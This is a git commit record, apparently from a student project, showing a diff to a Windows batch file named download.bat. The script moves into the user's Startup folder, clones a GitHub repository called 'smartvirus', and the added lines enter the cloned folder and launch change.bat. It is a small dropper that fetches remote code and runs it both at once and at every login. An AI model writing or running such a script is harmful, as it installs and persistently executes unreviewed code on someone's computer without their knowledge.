52aca5efec770082397808a0cec7860ad5c3d90b
mattis_tjn <mattis.tajan@ecoles-epsi.net>
2024-01-24 16:08:32 +0100

    chocoblast

--- download.bat
+++ download.bat
@@ -1,3 +1,5 @@
 cd AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup
 git clone https://github.com/mattistjnn/smartvirus
+cd AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/smartvirus
+start change.bat
 exit
